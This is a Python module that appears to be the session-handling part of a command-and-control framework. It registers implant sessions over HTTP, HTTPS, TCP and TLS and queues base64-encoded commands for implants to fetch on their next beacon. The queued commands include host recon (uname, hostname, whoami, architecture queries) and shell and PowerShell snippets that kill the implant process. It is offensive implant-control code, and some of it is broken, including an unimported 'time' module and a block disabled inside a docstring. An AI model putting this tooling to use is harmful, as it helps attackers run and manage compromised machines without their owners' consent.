import queue
import base64
import fnmatch
import uuid
import threading
import signal
from typing import Dict
from colorama import init, Fore, Style

brightgreen = "\001" + Style.BRIGHT + Fore.GREEN + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
brightred = "\001" + Style.BRIGHT + Fore.RED + "\002"
brightblue = "\001" + Style.BRIGHT + Fore.BLUE + "\002"


class Session:
    def __init__(self, sid, transport, handler):
        self.sid = sid
        self.transport = transport
        self.handler = handler
        self.merge_command_queue: Dict[str, queue.Queue(maxsize=1000)] = {}
        self.merge_response_queue: Dict[str, queue.Queue(maxsize=1000)] = {}
        self.lock = threading.Lock()
        self.recv_lock = threading.Lock()
        self.exec_lock = threading.Lock()
        self.command_queue = queue.Queue()
        self.output_queue = queue.Queue()
        self.meta_command_queue = queue.Queue(maxsize=1000)
        self.meta_output_queue = queue.Queue(maxsize=1000)
        self.metadata = {}
        self.metadata_stage = 0
        self.collection = 0
        self.mode = "detect_os"
        self.last_cmd_type = "meta"
        self.os_metadata_commands = []
        self.metadata_fields = []

        # Queue metadata commands immediately on creation:
        self.queue_metadata_commands()

    def queue_metadata_commands(self):
        cmd = "uname -a"
        self.meta_command_queue.put(base64.b64encode(cmd.encode()).decode())

    def detect_os(self, output: str):
        lower = output.lower()

        if "linux" in lower or "darwin" in lower:
            self.metadata["os"] = "Linux"
            self.metadata_fields = ["hostname", "user", "os", "arch"]
            self.os_metadata_commands = [
                ("hostname", "hostname"),
                ("user", "whoami"),
                #("os", "uname"),
                ("arch", "uname -m")
            ]
        else:
            self.metadata["os"] = "Windows"
            self.metadata_fields = ["hostname", "user", "os", "arch"]
            self.os_metadata_commands = [
                ("hostname", "hostname"),
                ("user", "whoami"),
                #("os", "powershell.exe -nop -Command \"((cmd.exe /c ver) | Select-String -Pattern 'Windows').Matches.Value\""),
                ("arch", '(Get-WmiObject Win32_OperatingSystem | Select-Object -ExpandProperty OSArchitecture)')
            ]

class TimeoutException(Exception):
    test = "dummyvalue"

def _timeout_handler(signum, frame):
    raise TimeoutException("Operation timed out!")

signal.signal(signal.SIGALRM, _timeout_handler)

# Global sessions dictionary
sessions = {}
alias_map: dict[str,str] = {}
dead_sessions: set[str] = set()

def kill_http_session(sid, os_type, beacon_interval=False):
    """if str(sid).lower() == "all":
        # make a static list since we'll be mutating sessions
        all_sids = list(sessions.keys())

        for s in all_sids:
            sess = sessions[s]
            meta = sess.metadata
            os_type = sess.meta.get("os", "").lower()
            transport = sess.transport.lower()
            display = next((a for a, rsid in alias_map.items() if rsid == s), s)

            # clean up any aliases
            for alias, real in list(alias_map.items()):
                if real == s:
                    del alias_map[alias]

            if transport in ("http", "https") and beacon_interval is False:
                return "BEACON_INTERVAL REQUIRED"

            if transport in ("http", "https"):
                # enqueue the EXIT_SHELL token
                if os_type == "linux":
                    cmd = "set -m; PGID=$$ ; trap 'exit 0' TERM INT; kill -TERM -0; exit 0"
                    sess.command_queue.put(base64.b64encode(cmd.encode()).decode())
                elif os_type == "windows":
                    cmd = "Stop-Process -Id $PID -Force"
                    sess.command_queue.put(base64.b64encode(cmd.encode()).decode())
                else:
                    print(brightred + f"[!] Unsupported operating system running on agent {display}")
                # wait for at least one beacon interval so the implant can pull it
                time.sleep(beacon_interval + 1)
                dead_sessions.add(s)
                del sessions[s]
                print(brightyellow + f"[*] Killed HTTP session {display}")

            elif transport == "tcp":
                # immediately tear down the socket
                sess.handler.close()
                dead_sessions.add(s)
                del sessions[s]
                print(brightyellow + f"[*] Closed TCP session {display}")

            else:
                print(brightred + f"[!] Unknown transport for session {display}, removing anyway")
                dead_sessions.add(s)
                del sessions[s]

        return True"""

    session = sessions[sid]
    if not session:
        return False

    # pick an OS‐appropriate self‐kill snippet
    if os_type.lower() == "windows":
        # Stop the PowerShell process in which the implant is running
        kill_snippet = "Stop-Process -Id $PID -Force"

    elif os_type.lower() == "linux":
        kill_snippet = "set -m; PGID=$$ ; trap 'exit 0' TERM INT; kill -TERM -0; exit 0"

    else:
        print(brightred + f"[!] Cannot kill session for unsupported operating system!")
        return False

    b64_cmd = base64.b64encode(kill_snippet.encode()).decode()

    # Queue the kill command (base64‐encoded) so the implant runs it on next poll
    session.command_queue.put(b64_cmd)

    # mark this session as dead so we don't re-register it
    dead_sessions.add(sid)

    # clean up any aliases pointing to it
    for alias, real in list(alias_map.items()):
        if real == sid:
            del alias_map[alias]

    sess = sessions.pop(sid, None)
    return True

def set_alias(alias: str, sid: str):   
    """Point alias → real SID."""
    alias_map[alias] = sid

def resolve_sid(raw: str) -> str|None:
    """Given a raw input (SID or alias), return the canonical SID, or None."""
    # exact alias match?
    if raw in alias_map:
        return alias_map[raw]

    # WILDCARD: if the user typed '*' or '?' in their SID, try glob match
    try:
        if any(ch in raw for ch in "*?"):
            # collect all real SIDs and their aliases
            # (we only need to match against sessions keys and alias_map keys)
            matches = [
                sid for sid in sessions
                if fnmatch.fnmatch(sid, raw)
            ]
            # also match against alias names, resolving to real SIDs
            matches += [
                alias_map[alias]
                for alias in alias_map
                if fnmatch.fnmatch(alias, raw)
            ]
            # de-duplicate while preserving order
            matches = list(dict.fromkeys(matches))

            if len(matches) == 1:
                return matches[0]

            elif len(matches) > 1:
                print(brightred + f"[!] Ambiguous session pattern '{raw}' → matches {matches!r}")

    except Exception as e:
        print(brightred + f"[!] Failed to resolve sid: {e}")
            

    # exact SID?
    if raw in sessions:
        return raw

    # no match
    return None

def register_http_session(sid):
    sessions[sid] = Session(sid, 'http', queue.Queue())

def register_https_session(sid):
    sessions[sid] = Session(sid, 'https', queue.Queue())

def register_tcp_session(sid, client_socket, is_ssl):
    if is_ssl:
        sessions[sid] = Session(sid, 'tls', client_socket)

    elif not is_ssl:
        sessions[sid] = Session(sid, 'tcp', client_socket)

    else:
        print(brightred + f"[-] ERROR an unknow error has ocurred!")

def is_http_session(sid):
    return sessions[sid].transport == 'http'

def is_tcp_session(sid):
    transport = sessions[sid].transport

    if transport == 'tcp':
        return sessions[sid].transport == 'tcp'

    elif transport == 'tls':
        return sessions[sid].transport == 'tls'

    else:
        print(brightred + f"[-] ERROR an unknown error has ocurred!")
        return False